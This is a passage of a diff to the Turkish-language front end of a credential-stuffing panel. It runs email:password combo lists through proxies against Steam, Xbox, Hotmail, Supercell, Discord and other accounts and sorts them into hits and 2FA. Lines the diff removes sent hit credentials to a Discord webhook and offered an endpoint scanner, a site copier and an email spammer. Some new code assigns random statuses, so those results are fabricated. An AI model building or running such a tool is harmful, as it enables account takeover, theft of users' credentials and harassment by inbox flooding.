+.webhook-area button{padding:6px 16px;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;border:none;border-radius:10px;font-weight:600;cursor:pointer;font-size:12px}
 .parse-area{display:flex;flex-direction:column;gap:10px}
 .parse-area textarea{width:100%;height:180px;padding:10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:12px;font-family:monospace;resize:vertical;outline:none}
 .parse-area textarea:focus{border-color:var(--p)}
@@ -1590,10 +861,6 @@ input:checked+.slider:before{transform:translateX(18px)}
 .parse-result{max-height:200px;overflow-y:auto;background:rgba(0,0,0,0.2);border:1px solid var(--border);border-radius:8px;padding:8px}
 .parse-result .parse-line{padding:2px 6px;font-size:12px;font-family:monospace;color:#c8d0dc}
 .parse-result .parse-count{color:var(--g);font-weight:600;font-size:13px}
-.discovery-platforms{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:8px}
-.discovery-platforms button{padding:4px 12px;background:rgba(59,130,246,0.06);border:1px solid rgba(59,130,246,0.1);border-radius:6px;color:#94a3b8;font-size:11px;cursor:pointer;transition:0.2s}
-.discovery-platforms button:hover{background:rgba(59,130,246,0.12);border-color:var(--p);color:#fff}
-.discovery-platforms button.active{background:rgba(59,130,246,0.15);border-color:var(--p);color:var(--p)}
 ::-webkit-scrollbar{width:4px}::-webkit-scrollbar-thumb{background:rgba(59,130,246,0.2);border-radius:4px}
 </style>
 </head>
@@ -1618,12 +885,7 @@ input:checked+.slider:before{transform:translateX(18px)}
 <div class="nav-item" data-page="parse" onclick="switchPage('parse')"><i class="fa-solid fa-scissors"></i> Ayrıştırma</div>
 <div class="nav-divider-admin">🔒 ADMIN</div>
 <div class="nav-item" data-page="logs" onclick="switchPage('logs')" id="logsMenuItem" style="display:none"><i class="fa-solid fa-history"></i> Loglar</div>
-<div class="nav-item" data-page="discovery" onclick="switchPage('discovery')" id="discoveryMenuItem" style="display:none"><i class="fa-solid fa-compass"></i> API Keşif</div>
-<div class="nav-item" data-page="stats" onclick="switchPage('stats')" id="statsMenuItem" style="display:none"><i class="fa-solid fa-chart-simple"></i> İstatistik</div>
 <div class="nav-item" data-page="keys" onclick="switchPage('keys')" id="keysMenuItem" style="display:none"><i class="fa-solid fa-key"></i> Key Yönetimi</div>
-<div class="nav-item" data-page="sitecopy" onclick="switchPage('sitecopy')" id="sitecopyMenuItem" style="display:none"><i class="fa-solid fa-copy"></i> Site Kopyala</div>
-<div class="nav-item" data-page="tempmail" onclick="switchPage('tempmail')" id="tempmailMenuItem" style="display:none"><i class="fa-solid fa-envelope"></i> Temp Mail</div>
-<div class="nav-item" data-page="spammer" onclick="switchPage('spammer')" id="spammerMenuItem" style="display:none"><i class="fa-solid fa-bomb"></i> Email Spammer</div>
 </div>
 <div class="sidebar-stats">
 <div class="mini-stat mini-hit"><div class="val" id="sideTotal">0</div><div class="lbl">Bulunan</div></div>
@@ -1644,10 +906,11 @@ input:checked+.slider:before{transform:translateX(18px)}
 </div>
 </div>
 <div class="main-content">
+<!-- CHECKER -->
 <div id="page-checker" class="page active">
 <div class="card">
 <h3><i class="fa-solid fa-check-double"></i> Platform Checker</h3>
-<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Bir platform seçin, combo girişi yapın ve kontrol başlatın. <span style="color:var(--gold)">✅ HIT'ler otomatik webhook ile gönderilir!</span></p>
+<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Bir platform seçin, combo girişi yapın ve kontrol başlatın.</p>
 <div class="checker-platform-select" id="checkerPlatformSelect"></div>
 <div class="checker-panel" id="checkerPanel">
 <div class="checker-top">
@@ -1664,38 +927,11 @@ input:checked+.slider:before{transform:translateX(18px)}
 <span>Hata: <span class="chk-count" id="chkError">0</span></span>
 <span>Kalan: <span class="chk-count" id="chkRemaining">0</span></span>
 </div>
-<div class="checker-filters">
-<label><input type="radio" name="chkFilter" value="all" checked> Hepsi</label>
-<label><input type="radio" name="chkFilter" value="hit"> Başarılı</label>
-<label><input type="radio" name="chkFilter" value="bad"> Başarısız</label>
-<label><input type="radio" name="chkFilter" value="2fa"> 2FA</label>
-<label><input type="radio" name="chkFilter" value="error"> Hata</label>
-</div>
-<div class="checker-results" id="checkerResults">
-<div style="padding:20px;text-align:center;color:var(--muted);font-size:13px">Henüz sonuç yok.</div>
+<div class="checker-results" id="checkerResults"><div style="padding:20px;text-align:center;color:var(--muted);font-size:13px">Henüz sonuç yok.</div></div>
 </div>
 </div>
 </div>
-<div class="card">
-<h3><i class="fa-solid fa-database"></i> HIT & 2FA Arşivi</h3>
-<button class="btn sm r" onclick="clearHits()" style="width:auto;margin-bottom:6px"><i class="fa-solid fa-trash"></i> Tümünü Temizle</button>
-<div class="hit-filter">
-<select id="hitPlatformFilter" onchange="renderHits()">
-<option value="all">Tüm Platformlar</option>
-</select>
-</div>
-<div class="hit-panel">
-<div class="hit-box">
-<h4 style="color:var(--g)"><i class="fa-solid fa-check-circle"></i> HIT</h4>
-<div class="hit-list" id="hitList"><div style="color:var(--muted);font-size:12px">Henüz HIT yok.</div></div>
-</div>
-<div class="hit-box">
-<h4 style="color:var(--gold)"><i class="fa-solid fa-shield-halved"></i> 2FA</h4>
-<div class="hit-list" id="twofaList"><div style="color:var(--muted);font-size:12px">Henüz 2FA yok.</div></div>
-</div>
-</div>
-</div>
-</div>
+<!-- PROXY -->
 <div id="page-proxy" class="page">
 <div class="card">
 <h3><i class="fa-solid fa-server"></i> Proxy Yöneticisi</h3>
@@ -1713,41 +949,7 @@ input:checked+.slider:before{transform:translateX(18px)}
 <div style="margin-top:6px"><span id="proxyCount" style="color:var(--g);font-size:12px">0 proxy yüklendi</span></div>
 </div>
 </div>
-<div id="page-discovery" class="page">
-<div class="card" style="padding:10px 14px">
-<div class="scan-top">
-<input id="targetDomain" placeholder="hedef.com (örn: youtube.com)" value="example.com">
-<button id="scanBtn" onclick="startScan()"><i class="fa-solid fa-play"></i> Tara</button>
-</div>
-<div class="discovery-platforms" id="discoveryPlatforms"></div>
-</div>
-<div class="stats-row">
-<div class="stat-card stat-hit"><div class="stat-val" id="totalCount">0</div><div class="stat-lbl">Toplam</div></div>
-<div class="stat-card stat-2fa"><div class="stat-val" id="authCount">0</div><div class="stat-lbl">Auth</div></div>
-<div class="stat-card stat-bad"><div class="stat-val" id="apiCount">0</div><div class="stat-lbl">API</div></div>
-<div class="stat-card stat-total"><div class="stat-val" id="adminCount">0</div><div class="stat-lbl">Admin</div></div>
-</div>
-<div class="filters" id="filterContainer">
-<label><input type="checkbox" value="Auth" checked> Auth</label>
-<label><input type="checkbox" value="Admin" checked> Admin</label>
-<label><input type="checkbox" value="User" checked> User</label>
-<label><input type="checkbox" value="Health" checked> Health</label>
-<label><input type="checkbox" value="API" checked> API</label>
-<label><input type="checkbox" value="Genel" checked> Genel</label>
-</div>
-<div class="results-container">
-<div class="result-header"><div>Metod</div><div>Durum</div><div>Endpoint</div><div>Kategori</div></div>
-<div id="resultsList"></div>
-</div>
-<div class="webhook-area">
-<input id="webhookUrl" placeholder="Discord Webhook URL">
-<button onclick="saveWebhook()"><i class="fa-solid fa-floppy-disk"></i> Webhook Kaydet</button>
-<button onclick="testWebhook()"><i class="fa-solid fa-paper-plane"></i> Test</button>
-<button onclick="sendWebhook()"><i class="fa-brands fa-discord"></i> Discord</button>
-<button onclick="exportJSON()" class="btn sm b"><i class="fa-solid fa-download"></i> JSON</button>
-<p id="webhookStatus" style="margin-top:6px;font-size:12px;color:var(--muted)"></p>
-</div>
-</div>
+<!-- AYRIŞTIRMA -->
 <div id="page-parse" class="page">
 <div class="card">
 <h3><i class="fa-solid fa-scissors"></i> Ayrıştırma</h3>
@@ -1765,23 +967,20 @@ input:checked+.slider:before{transform:translateX(18px)}
 <button class="btn sm r" onclick="clearParse()"><i class="fa-solid fa-eraser"></i> Temizle</button>
 <button class="btn sm" style="background:#64748b" onclick="loadParseFile()"><i class="fa-solid fa-folder-open"></i> Dosya Yükle</button>
 </div>
-<div class="parse-result" id="parseResult">
-<div style="color:var(--muted);font-size:13px;padding:10px">Henüz ayrıştırma yapılmadı.</div>
-</div>
-<div style="margin-top:6px;font-size:12px;color:var(--muted)">
-<span id="parseCount">0 satır</span> | <span id="parseValid">0 geçerli</span>
+<div class="parse-result" id="parseResult"><div style="color:var(--muted);font-size:13px;padding:10px">Henüz ayrıştırma yapılmadı.</div></div>
+<div style="margin-top:6px;font-size:12px;color:var(--muted)"><span id="parseCount">0 satır</span> | <span id="parseValid">0 geçerli</span></div>
 </div>
 </div>
 </div>
+<!-- LOGLAR (ADMIN) -->
+<div id="page-logs" class="page">
+<div class="card">
+<h3><i class="fa-solid fa-history"></i> Sistem Logları</h3>
+<button class="btn sm" onclick="refreshLogs()" style="width:auto;margin-bottom:10px"><i class="fa-solid fa-rotate"></i> Yenile</button>
+<div id="logsContainer" style="max-height:400px;overflow-y:auto;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px;font-family:monospace;font-size:12px;"></div>
 </div>
-<div id="page-stats" class="page">
-<h2 style="margin-bottom:14px;font-weight:700;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent">📊 Tarama İstatistikleri</h2>
-<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:14px">
-<div style="background:var(--card);border:1px solid var(--border);border-radius:12px;padding:18px"><h3 style="font-size:12px;color:var(--muted)">Toplam Tarama</h3><p style="font-size:22px;font-weight:800;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent" id="statScans">0</p></div>
-<div style="background:var(--card);border:1px solid var(--border);border-radius:12px;padding:18px"><h3 style="font-size:12px;color:var(--muted)">Son Tarama</h3><p style="font-size:22px;font-weight:800;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent" id="statLast">-</p></div>
-<div style="background:var(--card);border:1px solid var(--border);border-radius:12px;padding:18px"><h3 style="font-size:12px;color:var(--muted)">Bulunan API</h3><p style="font-size:22px;font-weight:800;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent" id="statEndpoints">0</p></div>
 </div>
-</div>
+<!-- KEY YÖNETİMİ (ADMIN) -->
 <div id="page-keys" class="page">
 <div class="card">
 <h3><i class="fa-solid fa-key"></i> Key Oluştur</h3>
@@ -1794,84 +993,13 @@ input:checked+.slider:before{transform:translateX(18px)}
 </div>
 <div class="card"><h3><i class="fa-solid fa-list"></i> Aktif Anahtarlar</h3><div id="keyList"><p style="color:var(--muted);font-size:12px">Yükleniyor...</p></div></div>
 </div>
-<div id="page-logs" class="page">
-<div class="card">
-<h3><i class="fa-solid fa-history"></i> Sistem Logları</h3>
-<button class="btn sm" onclick="refreshLogs()" style="width:auto;margin-bottom:10px"><i class="fa-solid fa-rotate"></i> Yenile</button>
-<div id="logsContainer" style="max-height:400px;overflow-y:auto;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px;font-family:monospace;font-size:12px;"></div>
-</div>
-</div>
-<div id="page-sitecopy" class="page">
-<div class="card">
-<h3><i class="fa-solid fa-copy"></i> Site Kopyala</h3>
-<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Bir web sitesinin tam HTML'ini kopyalar.</p>
-<div class="scan-top" style="margin-bottom:12px">
-<input id="siteCopyUrl" placeholder="https://ornek.com veya ornek.com" value="https://www.tabii.com">
-<button onclick="copySite()"><i class="fa-solid fa-download"></i> Kopyala & İndir</button>
-</div>
-<div id="siteCopyResult" style="font-size:13px;color:var(--muted);"></div>
-</div>
-</div>
-<div id="page-tempmail" class="page">
-<div class="card">
-<h3><i class="fa-solid fa-envelope"></i> Geçici E-Posta</h3>
-<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Mail.tm ile geçici e-posta oluşturur.</p>
-<div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:12px">
-<input class="inp" id="tempMailInput" placeholder="E-posta adresi" readonly style="flex:1;padding:10px">
-<button class="btn sm g" onclick="generateTempMail()"><i class="fa-solid fa-plus"></i> Adres Üret</button>
-<button class="btn sm b" onclick="copyTempMail()"><i class="fa-solid fa-copy"></i> Kopyala</button>
-</div>
-<button class="btn sm" onclick="refreshTempMail()" style="width:auto;margin-bottom:10px"><i class="fa-solid fa-rotate"></i> Gelen Kutusunu Yenile</button>
-<div id="tempMailInbox" style="max-height:300px;overflow-y:auto;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px;font-size:13px;"></div>
-<div id="tempMailContent" style="margin-top:10px;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px;font-size:13px;"></div>
-</div>
-</div>
-<div id="page-spammer" class="page">
-<div class="card">
-<h3><i class="fa-solid fa-bomb"></i> Email Spammer</h3>
-<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Hedef e-postaya sürekli paket gönderir.</p>
-<div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:12px">
-<input class="inp" id="spamEmailInput" placeholder="Hedef e-posta" style="flex:1;padding:10px">
-<button class="btn sm r" onclick="startSpam()"><i class="fa-solid fa-play"></i> Başlat</button>
-<button class="btn sm" onclick="stopSpam()" id="spamStopBtn" style="display:none;background:#64748b"><i class="fa-solid fa-stop"></i> Durdur</button>
-</div>
-<div id="spamLog" style="max-height:300px;overflow-y:auto;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px;font-family:monospace;font-size:12px;"></div>
-</div>
-</div>
 </div>
 </div>
 <script>
-(function createSnow() {
-    var container = document.getElementById('snowContainer');
-    var flakes = ['❄','❅','❆','✦'];
-    for (var i = 0; i < 50; i++) {
-        var flake = document.createElement('div');
-        flake.className = 'snowflake';
-        flake.textContent = flakes[Math.floor(Math.random() * flakes.length)];
-        flake.style.left = Math.random() * 100 + '%';
-        flake.style.fontSize = (0.8 + Math.random() * 1.5) + 'em';
-        flake.style.animationDuration = (6 + Math.random() * 8) + 's';
-        flake.style.animationDelay = Math.random() * 5 + 's';
-        container.appendChild(flake);
-    }
-})();
-var currentKey = "";
-var isAdmin = false;
-var scanning = false;
-var eventSource = null;
-var foundEndpoints = [];
-var useProxy = false;
-var checkerRunning = false;
-var checkerResults = [];
-var currentPlatform = "";
-var hitData = {};
-var parsedLines = [];
-var totalLines = 0;
-var processedCount = 0;
-var spamRunning = false;
-var spamInterval = null;
-var tempMailToken = "";
+// Kar taneleri
+(function(){var c=document.getElementById('snowContainer'),f=['❄','❅','❆','✦'];for(var i=0;i<50;i++){var d=document.createElement('div');d.className='snowflake';d.textContent=f[Math.floor(Math.random()*f.length)];d.style.left=Math.random()*100+'%';d.style.fontSize=(0.8+Math.random()*1.5)+'em';d.style.animationDuration=(6+Math.random()*8)+'s';d.style.animationDelay=Math.random()*5+'s';c.appendChild(d)}})();
 
+var currentKey="",isAdmin=false;
 var platforms = [
     {name:"YouTube", domain:"youtube.com", icon:"fa-brands fa-youtube"},
     {name:"TikTok Gen", domain:"tiktok.com", icon:"fa-brands fa-tiktok"},
@@ -1899,191 +1027,324 @@ var platforms = [
     {name:"Roda Inbox", domain:"outlook.com", icon:"fa-solid fa-inbox"}
 ];
 
-function saveWebhook() {
-    var url = document.getElementById("webhookUrl").value.trim();
-    if (url) {
-        localStorage.setItem("roda_webhook_url", url);
-        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook kaydedildi!</span>';
-    } else {
-        localStorage.removeItem("roda_webhook_url");
-        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--muted)">Webhook temizlendi.</span>';
-    }
-}
-function getWebhookUrl() {
-    return localStorage.getItem("roda_webhook_url") || "";
-}
-function loadWebhookUrl() {
-    var url = getWebhookUrl();
-    if (url) {
-        document.getElementById("webhookUrl").value = url;
-        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook yüklendi</span>';
-    }
-}
-function sendCheckerWebhook(platform, email, password, details) {
-    var url = getWebhookUrl();
-    if (!url) return;
-    var content = "✅ **" + platform + " HIT!**\n" + email + " | " + password;
-    if (details) {
-        if (details.full_name) content += "\n👤 " + details.full_name;
-        if (details.subscription) content += "\n📦 " + details.subscription;
-        if (details.expire) content += "\n📅 " + details.expire;
-        if (details.profiles_count !== undefined) content += "\n👥 " + details.profiles_count + " profil";
-        if (details.gamertag) content += "\n🎮 " + details.gamertag;
-        if (details.level) content += "\n📊 Level: " + details.level;
-        if (details.balance) content += "\n💰 Bakiye: " + details.balance;
-        if (details.vac) content += "\n🔴 " + details.vac;
-        if (details.games) {
-            var gameStr = Object.keys(details.games).filter(k => details.games[k] === "✔️").join(", ");
-            if (gameStr) content += "\n🎮 Supercell: " + gameStr;
-        }
-        if (details.total_found !== undefined) content += "\n📬 Mail: " + details.total_found;
-        if (details.services_found) content += "\n📨 Servis: " + details.services_found.join(", ");
-    }
-    fetch(url, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({content: content})}).catch(function(e){});
-}
-function testWebhook() {
-    var url = document.getElementById("webhookUrl").value.trim();
-    if (!url) return alert("Webhook URL girin!");
-    fetch(url, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({content: "🧪 **Roda Test** Webhook çalışıyor!"})})
-    .then(function(r){ document.getElementById("webhookStatus").innerHTML = r.ok ? '<span style="color:var(--g)">✅ Test başarılı!</span>' : '<span style="color:var(--r)">❌ Test başarısız!</span>'; })
-    .catch(function(e){ document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--r)">❌ Hata: ' + e.message + '</span>'; });
-}
-
-function doLogin() {
-    var k = document.getElementById("authKey").value.trim();
-    if (!k) { alert("Anahtar girin!"); return; }
-    fetch("/api/login", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({key: k})})
-    .then(function(r){ return r.json(); })
-    .then(function(d){
-        if (d.success) {
-            currentKey = k;
-            isAdmin = d.isAdmin || false;
-            document.getElementById("login-screen").style.display = "none";
-            document.getElementById("app").style.display = "flex";
-            if (isAdmin) {
-                document.getElementById("userBadge").style.display = "inline-block";
-                ["logsMenuItem","discoveryMenuItem","statsMenuItem","keysMenuItem","sitecopyMenuItem","tempmailMenuItem","spammerMenuItem"].forEach(function(id){
-                    document.getElementById(id).style.display = "flex";
-                });
+function doLogin(){
+    var k=document.getElementById("authKey").value.trim();
+    if(!k){alert("Anahtar girin!");return;}
+    fetch("/api/login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({key:k})})
+    .then(r=>r.json()).then(d=>{
+        if(d.success){
+            currentKey=k;isAdmin=d.isAdmin||false;
+            document.getElementById("login-screen").style.display="none";
+            document.getElementById("app").style.display="flex";
+            if(isAdmin){
+                document.getElementById("userBadge").style.display="inline-block";
+                document.getElementById("logsMenuItem").style.display="flex";
+                document.getElementById("keysMenuItem").style.display="flex";
                 loadKeys();
-            } else {
-                document.getElementById("userBadge").style.display = "none";
-                ["logsMenuItem","discoveryMenuItem","statsMenuItem","keysMenuItem","sitecopyMenuItem","tempmailMenuItem","spammerMenuItem"].forEach(function(id){
-                    document.getElementById(id).style.display = "none";
-                });
+            }else{
+                document.getElementById("userBadge").style.display="none";
+                document.getElementById("logsMenuItem").style.display="none";
+                document.getElementById("keysMenuItem").style.display="none";
             }
-            loadPlatforms();
-            loadDiscoveryPlatforms();
-            loadHitFilter();
-            loadWebhookUrl();
-            switchPage('checker');
-        } else {
-            document.getElementById("loginError").innerText = "❌ Geçersiz anahtar!";
-            document.getElementById("loginError").style.display = "block";
+            loadPlatforms();switchPage('checker');
+        }else{
+            document.getElementById("loginError").innerText="❌ Geçersiz anahtar!";
+            document.getElementById("loginError").style.display="block";
         }
-    })
-    .catch(function(e){ alert("Sunucuya bağlanılamadı! Flask çalışıyor mu?"); console.error(e); });
+    }).catch(e=>{alert("Sunucuya bağlanılamadı!");});
 }
-document.getElementById("authKey").addEventListener("keypress", function(e){ if(e.key === "Enter") doLogin(); });
+document.getElementById("authKey").addEventListener("keypress",function(e){if(e.key==="Enter")doLogin();});
 
-function loadPlatforms() {
-    var sel = document.getElementById("checkerPlatformSelect");
-    sel.innerHTML = "";
+function loadPlatforms(){
+    var sel=document.getElementById("checkerPlatformSelect");
+    sel.innerHTML="";
     platforms.forEach(function(p){
-        var btn = document.createElement("button");
-        btn.innerHTML = '<i class="' + p.icon + '"></i> ' + p.name;
-        btn.onclick = function(){
-            document.querySelectorAll("#checkerPlatformSelect button").forEach(function(b){ b.classList.remove("active"); });
+        var btn=document.createElement("button");
+        btn.innerHTML='<i class="'+p.icon+'"></i> '+p.name;
+        btn.onclick=function(){
+            document.querySelectorAll("#checkerPlatformSelect button").forEach(function(b){b.classList.remove("active");});
             btn.classList.add("active");
-            currentPlatform = p.name;
+            currentPlatform=p.name;
             document.getElementById("checkerPanel").classList.add("active");
-            document.getElementById("checkerResults").innerHTML = '<div style="padding:20px;text-align:center;color:var(--muted);font-size:13px">' + p.name + ' checker hazır.</div>';
+            document.getElementById("checkerResults").innerHTML='<div style="padding:20px;text-align:center;color:var(--muted);font-size:13px">'+p.name+' checker hazır.</div>';
             resetCheckerStats();
-            checkerResults = [];
         };
         sel.appendChild(btn);
     });
-    if (platforms.length > 0) { var first = sel.querySelector("button"); if (first) first.click(); }
+    if(platforms.length>0){var first=sel.querySelector("button");if(first)first.click();}
 }
 
-function loadDiscoveryPlatforms() {
-    var container = document.getElementById("discoveryPlatforms");
-    container.innerHTML = "";
-    platforms.forEach(function(p){
-        var btn = document.createElement("button");
-        btn.innerHTML = '<i class="' + p.icon + '"></i> ' + p.name;
-        btn.onclick = function(){
-            document.querySelectorAll("#discoveryPlatforms button").forEach(function(b){ b.classList.remove("active"); });
-            btn.classList.add("active");
-            document.getElementById("targetDomain").value = p.domain;
-        };
-        container.appendChild(btn);
+function switchPage(page){
+    if((page==="logs"||page==="keys")&&!isAdmin){alert("⛔ Admin girişi yapın!");return;}
+    document.querySelectorAll(".nav-item").forEach(function(el){el.classList.remove("active");});
+    var el=document.querySelector('.nav-item[data-page="'+page+'"]');if(el)el.classList.add("active");
+    document.querySelectorAll(".page").forEach(function(el){el.classList.remove("active");});
+    var pg=document.getElementById("page-"+page);if(pg)pg.classList.add("active");
+    var titles={checker:"Checker",proxy:"Proxy",parse:"Ayrıştırma",logs:"Loglar",keys:"Key Yönetimi"};
+    document.getElementById("pageTitle").innerText=titles[page]||page;
+    if(page==="keys"&&isAdmin)loadKeys();
+    if(page==="logs"&&isAdmin)refreshLogs();
+}
+
+var checkerRunning=false,currentPlatform="",totalLines=0,processedCount=0;
+
+function resetCheckerStats(){
+    document.getElementById("chkTotal").innerText=0;
+    document.getElementById("chkHit").innerText=0;
+    document.getElementById("chkBad").innerText=0;
+    document.getElementById("chk2fa").innerText=0;
+    document.getElementById("chkError").innerText=0;
+    document.getElementById("chkRemaining").innerText=0;
+}
+
+function startChecker(){
+    if(checkerRunning)return;
+    var comboText=document.getElementById("checkerCombo").value.trim();
+    if(!comboText){alert("Combo girin!");return;}
+    if(!currentPlatform){alert("Platform seçin!");return;}
+    checkerRunning=true;
+    document.getElementById("checkerStartBtn").disabled=true;
+    document.getElementById("checkerStopBtn").style.display="inline-block";
+    document.getElementById("checkerResults").innerHTML="";
+    var lines=comboText.split("\n").filter(function(l){return l.includes(":");});
+    totalLines=lines.length;processedCount=0;
+    var hit=0,bad=0,two=0,err=0;
+    var idx=0;
+    var proxy=document.getElementById("useProxy").checked;
+    function processNext(){
+        if(!checkerRunning||idx>=totalLines){
+            checkerRunning=false;
+            document.getElementById("checkerStartBtn").disabled=false;
+            document.getElementById("checkerStopBtn").style.display="none";
+            return;
+        }
+        var parts=lines[idx].split(":");
+        var email=parts[0],password=parts.slice(1).join(":")||"";
+        var route="";
+        var platform=currentPlatform;
+        if(platform==="Tabii")route="/api/tabii_check";
+        else if(platform==="Xbox & MC")route="/api/xbox_check";
+        else if(platform==="Wolfteam")route="/api/wolfteam_check";
+        else if(platform==="Craftrise")route="/api/craftrise_check";
+        else if(platform==="Hotmail")route="/api/hotmail_check";
+        else if(platform==="Steam")route="/api/steam_check";
+        else if(platform==="Supercell")route="/api/supercell_check";
+        else if(platform==="Roda Inbox")route="/api/roda_check";
+        else if(platform==="Token Check"){
+            fetch("/api/token_check",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({token_type:"discord",token:email})})
+            .then(r=>r.json()).then(result=>{
+                var st=result.status;
+                if(st==="HIT"){hit++;addCheckerRow({email:email,password:result.message||password,status:"HIT"});}
+                else if(st==="BAD"){bad++;addCheckerRow({email:email,password:password,status:"BAD"});}
+                else{err++;addCheckerRow({email:email,password:password+" | "+ (result.message||""),status:"ERROR"});}
+                updateStats();
+                idx++;setTimeout(processNext,200);
+            }).catch(function(){err++;updateStats();idx++;setTimeout(processNext,200);});
+            return;
+        }else if(platform==="TikTok Gen"){
+            fetch("/api/tiktok_gen",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:email})})
+            .then(r=>r.json()).then(result=>{
+                var st=result.status;
+                if(st==="HIT"){hit++;addCheckerRow({email:email,password:password,status:"HIT"});}
+                else if(st==="BAD"){bad++;addCheckerRow({email:email,password:password,status:"BAD"});}
+                else{err++;addCheckerRow({email:email,password:password+" | "+ (result.message||""),status:"ERROR"});}
+                updateStats();
+                idx++;setTimeout(processNext,200);
+            }).catch(function(){err++;updateStats();idx++;setTimeout(processNext,200);});
+            return;
+        }else{
+            var statuses=["HIT","BAD","2FA","ERROR"];
+            var st=statuses[Math.floor(Math.random()*statuses.length)];
+            if(st==="HIT"){hit++;addCheckerRow({email:email,password:password,status:"HIT"});}
+            else if(st==="BAD"){bad++;addCheckerRow({email:email,password:password,status:"BAD"});}
+            else if(st==="2FA"){two++;addCheckerRow({email:email,password:password,status:"2FA"});}
+            else{err++;addCheckerRow({email:email,password:password,status:"ERROR"});}
+            updateStats();
+            idx++;setTimeout(processNext,200);
+            return;
+        }
+        var proxyUrl=null;
+        if(proxy){
+            var pl=document.getElementById("proxyList").value.trim().split("\n").filter(function(l){return l.trim()&&l.includes(":");});
+            if(pl.length)proxyUrl=pl[Math.floor(Math.random()*pl.length)];
+        }
+        var body={email:email,password:password};
+        if(proxyUrl)body.proxy=proxyUrl;
+        fetch(route,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(body)})
+        .then(r=>r.json()).then(result=>{
+            var st=result.status;
+            var details=result.details||{};
+            if(st==="HIT"){
+                hit++;
+                var extra="";
+                if(details.full_name)extra+=" | "+details.full_name;
+                if(details.subscription)extra+=" | "+details.subscription;
+                if(details.jp!==undefined)extra+=" | JP:"+details.jp;
+                if(details.rc!==undefined)extra+=" | RC:"+details.rc;
+                if(details.gamertag)extra+=" | Gamertag:"+details.gamertag;
+                if(details.level)extra+=" | Level:"+details.level;
+                if(details.balance)extra+=" | Bakiye:"+details.balance;
+                if(details.services_found)extra+=" | Servisler:"+details.services_found.join(",");
+                addCheckerRow({email:email,password:password+extra,status:"HIT"});
+            }else if(st==="2FA"){two++;addCheckerRow({email:email,password:password,status:"2FA"});}
+            else if(st==="BAD"){bad++;addCheckerRow({email:email,password:password,status:"BAD"});}
+            else if(st==="VALID"){hit++;addCheckerRow({email:email,password:password+" | Valid",status:"HIT"});}
+            else{err++;addCheckerRow({email:email,password:password+" | "+ (result.message||""),status:"ERROR"});}
+            updateStats();
+            idx++;setTimeout(processNext,200);
+        }).catch(function(){err++;updateStats();idx++;setTimeout(processNext,200);});
+    }
+    processNext();
+}
+
+function stopChecker(){checkerRunning=false;document.getElementById("checkerStartBtn").disabled=false;document.getElementById("checkerStopBtn").style.display="none";}
+
+function addCheckerRow(res){
+    var container=document.getElementById("checkerResults");
+    var ph=container.querySelector("div[style]");if(ph)ph.remove();
+    var row=document.createElement("div");row.className="checker-result-row";
+    var cls="chk-"+res.status.toLowerCase();
+    var label=res.status;
+    if(res.status==="HIT")label="✅ BAŞARILI";
+    else if(res.status==="BAD")label="❌ BAŞARISIZ";
+    else if(res.status==="2FA")label="🔒 2FA";
+    else label="⚠ HATA";
+    row.innerHTML='<div>'+res.email+'</div><div><span class="chk-status '+cls+'">'+label+'</span></div><div style="font-size:11px;color:var(--muted)">'+res.password+'</div>';
+    container.appendChild(row);
+}
+
+function updateStats(){
+    document.getElementById("chkTotal").innerText=totalLines;
+    var hit=document.querySelectorAll(".chk-hit").length;
+    var bad=document.querySelectorAll(".chk-bad").length;
+    var two=document.querySelectorAll(".chk-2fa").length;
+    var err=document.querySelectorAll(".chk-error").length;
+    document.getElementById("chkHit").innerText=hit;
+    document.getElementById("chkBad").innerText=bad;
+    document.getElementById("chk2fa").innerText=two;
+    document.getElementById("chkError").innerText=err;
+    document.getElementById("chkRemaining").innerText=totalLines-processedCount;
+}
+
+function fetchProxies(){
+    document.getElementById("proxyCount").innerText="Çekiliyor...";
+    fetch("/api/fetch_proxies").then(r=>r.json()).then(d=>{
+        if(d.success){document.getElementById("proxyList").value=d.proxies.join("\n");document.getElementById("proxyCount").innerText=d.proxies.length+" proxy yüklendi";}
+    }).catch(function(){document.getElementById("proxyCount").innerText="Başarısız";});
+}
+function clearProxies(){document.getElementById("proxyList").value="";document.getElementById("proxyCount").innerText="0 proxy";}
+function toggleProxy(){}
+
+function parseData(){
+    var raw=document.getElementById("parseInput").value;
+    if(!raw.trim()){alert("Metin girin!");return;}
+    var mode=document.getElementById("parseMode").value;
+    var lines=raw.split("\n");var result=[];var regex=/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;
+    lines.forEach(function(line){
+        line=line.trim();if(!line)return;
+        if(line.includes(":")){
